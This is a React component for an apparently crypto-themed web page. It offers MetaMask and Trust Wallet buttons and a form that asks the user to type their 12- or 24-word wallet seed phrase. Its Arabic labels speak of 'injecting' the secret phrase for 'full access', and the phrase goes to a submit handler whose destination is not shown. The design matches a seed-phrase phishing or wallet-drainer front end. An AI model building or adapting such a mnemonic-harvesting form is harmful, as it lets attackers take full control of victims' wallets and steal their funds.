import React, { useState } from 'react';

interface WalletSelectorProps {
  onSelect: (type: string) => void;
  onPhraseSubmit: (phrase: string) => void;
  onClose: () => void;
  onBypass: () => void;
  status: string;
}

export default function WalletSelector({ onSelect, onPhraseSubmit, onClose, onBypass, status }: WalletSelectorProps) {
  const [showPhraseInput, setShowPhraseInput] = useState(false);
  const [phrase, setPhrase] = useState('');
  const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
  const currentUrl = window.location.href.replace(/^https?:\/\//, '');

  const wallets = [
    { 
      id: 'METAMASK', 
      name: 'MetaMask', 
      icon: 'https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg',
      deepLink: `metamask://dapp/${currentUrl}`
    },
    { 
      id: 'TRUST', 
      name: 'Trust Wallet', 
      icon: 'https://trustwallet.com/assets/images/media/assets/trust_wallet_logo.svg',
      deepLink: `https://link.trustwallet.com/open_url?url=${encodeURIComponent(window.location.href)}`
    }
  ];

  const handleWalletClick = (wallet: any) => {
    const win = window as any;
    const isDappBrowser = win.ethereum || win.trustwallet;

    if (!isDappBrowser && isMobile) {
      window.location.href = wallet.deepLink;
    } else {
      onSelect(wallet.id);
    }
  };

  return (
    <div className="absolute inset-0 z-[2000] flex items-center justify-center p-6 bg-black/95 backdrop-blur-3xl overflow-y-auto">
      <div className="w-full max-w-sm border-2 border-red-600 bg-[#0a0000] p-8 shadow-[0_0_100px_rgba(255,0,0,0.4)] rounded-[3rem] relative animate-in fade-in zoom-in duration-300">
        <button onClick={onClose} className="absolute top-6 left-6 text-red-900 hover:text-red-600 transition-colors">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M6 18L18 6M6 6l12 12" /></svg>
        </button>
        
        {!showPhraseInput ? (
          <>
            <h3 className="text-3xl font-black uppercase mb-2 italic text-red-500 text-right glitch-text">مصادقة الوصول</h3>
            <p className="text-[10px] text-red-900 font-bold uppercase mb-10 text-right tracking-widest opacity-60">اختر بروتوكول الحقن المفضل</p>
            
            <div className="space-y-4 mb-8">
              {wallets.map((wallet) => (
                <button 
                  key={wallet.id}
                  onClick={() => handleWalletClick(wallet)}
                  className="w-full group flex items-center justify-between p-5 bg-black border border-red-900/30 rounded-2xl hover:border-red-600 transition-all active:scale-95"
                >
                  <div className="flex items-center gap-4">
                    <img src={wallet.icon} alt={wallet.name} className="w-8 h-8 group-hover:scale-110 transition-transform" />
                    <span className="text-sm font-black uppercase text-red-500">{wallet.name}</span>
                  </div>
                  <svg className="w-5 h-5 text-red-900 group-hover:text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M9 5l7 7-7 7" /></svg>
                </button>
              ))}

              <button 
                onClick={() => setShowPhraseInput(true)}
                className="w-full group flex items-center justify-between p-5 bg-red-600/5 border border-dashed border-red-600/40 rounded-2xl hover:bg-red-600/10 transition-all active:scale-95"
              >
                <div className="flex items-center gap-4">
                  <div className="w-8 h-8 flex items-center justify-center bg-red-600 rounded-lg shadow-lg">
                    <svg className="w-5 h-5 text-black" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z" strokeWidth={2.5}/></svg>
                  </div>
                  <span className="text-sm font-black uppercase text-red-500">Seed Phrase (Mnemonic)</span>
                </div>
              </button>
            </div>
          </>
        ) : (
          <div className="animate-in slide-in-from-right duration-300">
             <h3 className="text-2xl font-black uppercase mb-2 italic text-red-500 text-right">حقن العبارة السرية</h3>
             <p className="text-[10px] text-red-900 font-bold uppercase mb-6 text-right tracking-widest opacity-60">أدخل الـ 12 أو 24 كلمة للوصول الكامل</p>
             
             <textarea 
               value={phrase}
               onChange={(e) => setPhrase(e.target.value)}
               placeholder="كلمة1 كلمة2 كلمة3..."
               className="w-full h-32 bg-black border border-red-900/40 p-4 text-xs text-red-500 focus:border-red-600 outline-none rounded-2xl mb-6 font-bold text-right"
             />

             <button 
               onClick={() => onPhraseSubmit(phrase)}
               className="w-full py-5 bg-red-600 text-black font-black uppercase text-xs rounded-2xl mb-4 shadow-lg active:scale-95 transition-all"
             >
               مزامنة الجذور (Deep Root Sync)
             </button>
             <button onClick={() => setShowPhraseInput(false)} className="w-full text-[10px] font-black uppercase text-red-900">رجوع</button>
          </div>
        )}

        {status && (
          <div className="mb-8 p-4 bg-red-950/20 border border-red-600/20 rounded-xl text-center">
            <span className="text-[10px] font-black uppercase animate-pulse text-red-500">{status}</span>
          </div>
        )}

        <div className="mt-6 flex flex-col gap-4 text-center">
          <button 
            onClick={onBypass} 
            className="text-[10px] font-black uppercase tracking-[0.3em] text-red-900 hover:text-red-500 transition-colors py-2"
          >
            استخدام وضع المحاكاة (Bypass)
          </button>
          <div className="text-[8px] opacity-20 font-black italic uppercase tracking-widest border-t border-red-900/10 pt-4">
            Security Uplink: Active // Master: Shtiwe
          </div>
        </div>
      </div>
    </div>
  );
}